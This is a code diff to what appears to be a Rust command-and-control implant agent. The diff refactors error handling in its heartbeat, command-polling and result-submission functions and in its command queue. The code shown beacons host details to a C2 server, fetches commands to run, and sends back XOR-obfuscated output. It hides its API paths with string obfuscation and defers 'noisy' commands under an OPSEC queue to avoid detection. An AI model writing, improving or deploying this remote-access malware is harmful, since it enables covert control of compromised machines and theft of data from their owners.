@@ -150,12 +150,15 @@ fn mark_noisy_command_executed() {
 pub async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<()> {
     let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/heartbeat").to_string().replace("{}", agent_id));
     info!("[HTTP] Sending heartbeat POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
-    let client_result = config.build_http_client();
-    if client_result.is_err() { // Handle client build failure as a C2 failure
-        update_c2_failure_state(false);
-        return Err(io::Error::new(io::ErrorKind::Other, client_result.err().unwrap()));
-    }
-    let client = client_result.unwrap();
+    
+    let client = match config.build_http_client() {
+        Ok(client) => client,
+        Err(e) => {
+            error!("[HTTP] Failed to build HTTP client: {}", e);
+            update_c2_failure_state(false);
+            return Err(e);
+        }
+    };
     
     let os = os_info::get();
     let hostname = hostname::get()?
@@ -199,12 +202,15 @@ pub async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str,
 async fn get_command_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
     let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/command").to_string().replace("{}", agent_id));
     info!("[HTTP] Sending command GET to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
-    let client_result = config.build_http_client();
-    if client_result.is_err() {
-        update_c2_failure_state(false);
-        return Err(io::Error::new(io::ErrorKind::Other, client_result.err().unwrap()));
-    }
-    let client = client_result.unwrap();
+    
+    let client = match config.build_http_client() {
+        Ok(client) => client,
+        Err(e) => {
+            error!("[HTTP] Failed to build HTTP client: {}", e);
+            update_c2_failure_state(false);
+            return Err(e);
+        }
+    };
 
     match client.get(&url).send().await {
         Ok(response) => {
@@ -250,12 +256,16 @@ async fn submit_result_with_client(
 ) -> io::Result<()> {
     let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/result").to_string().replace("{}", agent_id));
     info!("[HTTP] Sending result POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
-    let client_result = config.build_http_client();
-    if client_result.is_err() {
-        update_c2_failure_state(false);
-        return Err(io::Error::new(io::ErrorKind::Other, client_result.err().unwrap()));
-    }
-    let client = client_result.unwrap();
+    
+    let client = match config.build_http_client() {
+        Ok(client) => client,
+        Err(e) => {
+            error!("[HTTP] Failed to build HTTP client: {}", e);
+            update_c2_failure_state(false);
+            return Err(e);
+        }
+    };
+    
     let obfuscated_output = xor_obfuscate(output, agent_id);
     let data = json!({
         "command": command,
@@ -366,10 +376,18 @@ pub async fn agent_loop(
                 
                 // Check if we should queue this command or execute immediately
                 if should_queue_command(&command) {
-                    // Queue the command
-                    let mut queue_guard = QUEUED_COMMANDS.lock().unwrap();
-                    queue_guard.push(command.clone());
-                    info!("[OPSEC] Command '{}' queued (total queued: {})", command, queue_guard.len());
+                    // Queue the command using safe mutex
+                    match crate::safe_mutex::with_lock_mut(&QUEUED_COMMANDS, |queue| {
+                        queue.push(command.clone());
+                        queue.len()
+                    }) {
+                        Ok(queue_len) => {
+                            info!("[OPSEC] Command '{}' queued (total queued: {})", command, queue_len);
+                        }
+                        Err(e) => {
+                            error!("[OPSEC] Failed to queue command: {}", e);
+                        }
+                    }
                 } else {
                     // Execute immediately (only weak commands in BackgroundOpsec)
                     info!("[SHELL] Executing weak command immediately: {}", command);
@@ -404,10 +422,14 @@ pub async fn agent_loop(
         // --- Process Queued Commands --- 
         // Always check and process queue while in BackgroundOpsec
         let mut commands_to_run = Vec::new();
-        {
-            let mut queue_guard = QUEUED_COMMANDS.lock().unwrap();
-            commands_to_run.extend(queue_guard.drain(..));
-        } // Lock released
+        match crate::safe_mutex::with_lock_mut(&QUEUED_COMMANDS, |queue| {
+            commands_to_run.extend(queue.drain(..));
+        }) {
+            Ok(_) => {},
+            Err(e) => {
+                error!("[SHELL] Failed to access command queue: {}", e);
+            }
+        }
         
         if !commands_to_run.is_empty() {
             info!("[SHELL] Processing {} queued commands", commands_to_run.len());
